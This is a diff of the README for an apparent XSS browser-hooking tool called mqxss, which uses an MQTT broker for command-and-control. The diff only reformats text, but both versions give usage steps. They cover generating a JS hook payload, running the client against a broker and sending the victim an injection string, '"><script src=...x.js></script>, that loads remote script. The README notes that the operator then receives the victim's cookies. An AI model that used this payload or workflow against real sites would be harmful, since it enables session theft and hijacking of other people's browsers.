@@ -23,9 +23,11 @@ The client utilizes the python paho.mqtt library while the js payload utilizes '
  
 **To generate a JS payload** to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.  
 
-**To run the client** provide your broker, port, and topic as so `mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname`
+**To run the client** provide your broker, port, and topic as so 
  
-**Send your XSS payload** to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
+`mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname`
+ 
+**Send your XSS payload** to the victim while the mqxss client is running, ex: `'"><script src=https://example.com/x.js></script>` or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
  
 ![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)
 
